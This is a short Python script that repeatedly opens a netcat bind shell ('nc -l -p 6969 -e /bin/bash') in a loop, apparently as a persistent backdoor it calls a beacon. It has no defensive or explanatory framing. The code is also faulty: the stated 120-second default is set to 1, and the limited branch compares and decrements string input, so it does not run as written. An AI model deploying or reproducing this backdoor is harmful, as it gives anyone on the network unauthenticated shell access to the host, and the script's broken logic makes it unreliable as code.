import time
import os
import subprocess

delay = input("How many seconds should I wait to re-open the beacon?(120s default)")
limit = input("should I stop after a certian amount of iterations? (No limit default)")

if delay == '':
    delay = 1

if limit == '':
    while True:
        os.system("nc -l -p 6969 -e /bin/bash")
        time.sleep(5)

else:
    while limit > 0:
        os.system("nc -l -p 6969 -e /bin/bash")
        time.sleep(delay)
        limit -= 1
